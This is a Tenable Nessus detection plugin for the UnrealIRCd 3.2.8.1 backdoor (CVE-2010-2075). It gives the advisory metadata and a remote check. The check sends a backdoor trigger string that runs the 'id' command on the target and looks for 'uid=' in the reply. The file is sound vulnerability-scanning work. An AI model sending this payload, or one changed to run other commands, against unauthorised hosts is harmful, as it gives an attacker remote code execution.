#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(46882);
 script_version("$Revision: 1.11 $");
 script_cvs_date("$Date: 2016/12/01 21:21:53 $");

 script_cve_id("CVE-2010-2075");
 script_bugtraq_id(40820);
 script_osvdb_id(65445);
 
 script_name(english:"UnrealIRCd Backdoor Detection");
 script_summary(english:"IRCD version");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IRC server contains a backdoor.");
 script_set_attribute(attribute:"description", value:
"The remote IRC server is a version of UnrealIRCd with a backdoor
that allows an attacker to execute arbitrary code on the affected
host.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Jun/277");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Jun/284");
 script_set_attribute(attribute:"see_also", value:"http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt");
 script_set_attribute(attribute:"solution", value:
"Re-download the software, verify it using the published MD5 / SHA1
checksums, and re-install it.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'UnrealIRCD 3.2.8.1 Backdoor Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'White_Phosphorus');

 script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/12");
 script_set_attribute(attribute:"patch_publication_date", value:"2010/06/12");
 script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/14");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:unrealircd:unrealircd");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");
 script_family(english:"Backdoors");

 script_dependencie("find_service1.nasl", "find_service2.nasl", "ircd.nasl");
 script_require_ports("Services/irc", 6667);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");


port = get_service(svc:"irc", default:6667, exit_on_fail:TRUE);

key = string("irc/banner/", port);
banner = get_kb_item(key);
if (!banner) exit(0, "Could not talk to the IRC server on port "+port+".");


soc = open_sock_tcp(port);
if (! soc) exit(1, "Can't open socket on port "+port+".");

repeat {
 r = recv_line(socket:soc, length:4096);
 n++;
 if ( n > 1024 ) exit(0, "Unexpected answer from the remote IRC server on port "+port+".");
} until (isnull(r) );

 send(socket:soc, data:'AB; for i in `ls /proc/$PPID/fd|sort -nr` ; do id >&$i; done ;');
 if ( get_port_transport(port) > ENCAPS_IP && defined_func("socket_reset_ssl") ) socket_reset_ssl(soc);
r = recv_line(socket:soc, length:4096);
if ( "uid=" >< r )
{
 security_hole(port:port, extra:'\nThe remote IRC server is running as :\n\n' + r);
}
